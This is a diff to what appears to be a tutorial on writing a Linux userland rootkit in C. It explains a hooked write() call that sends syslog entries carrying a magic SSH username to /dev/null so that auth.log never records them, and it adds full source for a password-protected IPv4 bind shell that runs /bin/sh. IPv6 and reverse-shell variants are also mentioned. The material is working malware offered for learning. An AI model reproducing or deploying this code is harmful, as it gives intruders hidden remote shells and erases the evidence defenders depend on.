@@ -183,12 +183,67 @@ ssize_t write(int fildes, const void *buf, size_t nbytes)
         result = new_write(fildes, buf, nbytes);
         ipv6_rev();
     }
+    
+    return result;
+}
  ```
  Although long, there's not a lot to get through here. We've basically used `if/else if` to check the buffer being written for mulitple sub-strings that we're using as our trigger. Let's break it down:
  + `if (bind4 != NULL)` we check to see if the variable `bind4` is `NULL` and if it's not, we jump to our logic;
  + `fildes = open("/dev/null", O_WRONLY | O_APPEND);` if it's not `NULL`, then we have a match, we know we're trying to activate the rootkit because we sent our magic string `notavaliduser4` as an SSH attempt. Of course that will fail, so `syslog` will log that and activate our hooked `write()` syscall. Since we have a match, we don't actually want it written to log that we tried to do fishy stuff. So let's re-route the `write()` operation by first using `open()` to open `/dev/null` in an append and write mode and then passing that return value to the `int filedes` variable we had already used in our function declaration. It should be mentioned that routing to `/dev/null` is just one solution, you could also just not `write()` at all. You are God here (well, userland God anyway);
  + `result = new_write(fildes, buf, nbytes);` we now do a normal write operation on `/dev/null` and give the return value to our `ssize_t result` variable we defined in our function declaration. This `result` variable can now be delivered to follow on functions. `syslog` calls something like `open()` to open `auth.log` it then calls `write()` because it has a buffer it needs to put in the file (our failed SSH attempt) and then the write operation returns a result in the form of our variable `result` which is probably just an indication of completion or failure. To the process, nothing here is broken, it called write, and got a result as intended. Know that when `syslog` called `write()` here, it had values it used as arguments in place of the function declaration arugments. It didn't pass `const void *buf` to `write()` when it called it for example, it passed it something like a pointer to a string that said "failed SSH attempt for...";
- + `ipv4_bind()` is the name of a function that is being called. That function is defined above in the program. We will show what that is later, but essentially it's just our IPV4 TCP bind shell that we wrote in a previous assignment on port 65065. So, our trigger hit the write buffer, was written to `/dev/null` instead of `/var/log/auth.log` 
+ + `ipv4_bind()` is the name of a function that is being called which binds a command shell to a listening port. That function is defined above in the program. We will show what that is later, but essentially it's just our IPV4 TCP bind shell that we wrote in a previous assignment on port 65065. 
+ 
+ So, our trigger hit the write buffer, was written to `/dev/null` instead of `/var/log/auth.log`, a function opening a bind shell was called, and then finally we need to return the result to the calling process so it knows whether or not the `write()` function worked. We accomplish that with the last bit of code `return result;`. 
+ 
+ We have quite a few possiblities here. All in all, there are 4 distinct triggers for an IPv4 bindshell, IPv6 bindshell, IPv4 reverse-shell, and IPv6 reverse shell. Let's dig into those a bit. We won't recapitulate the entire piece of code in each since we've already completed [a bind shell](https://github.com/h0mbre/Learning-C/tree/master/Assignment-26), but we'll focus on the new aspects. Here is each function. 
+ 
+ ### IPv4 Bind Shell
+ ```c
+ int ipv4_bind (void)
+{
+    struct sockaddr_in addr;
+    addr.sin_family = AF_INET;
+    addr.sin_port = htons(LOC_PORT);
+    addr.sin_addr.s_addr = INADDR_ANY;
+
+    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
+
+    const static int optval = 1;
+
+    setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));
+
+    bind(sockfd, (struct sockaddr*) &addr, sizeof(addr));
+
+    listen(sockfd, 0);
+
+    int new_sockfd = accept(sockfd, NULL, NULL);
+
+    for (int count = 0; count < 3; count++)
+    {
+        dup2(new_sockfd, count);
+    }
+
+    char input[30];
+
+    read(new_sockfd, input, sizeof(input));
+    input[strcspn(input, "\n")] = 0;
+    if (strcmp(input, PASS) == 0)
+    {
+        execve("/bin/sh", NULL, NULL);
+        close(sockfd);
+    }
+    else 
+    {
+        shutdown(new_sockfd, SHUT_RDWR);
+        close(sockfd);
+    }
+    
+}
+```
+
+ 
+ 
+ 
 
 
 
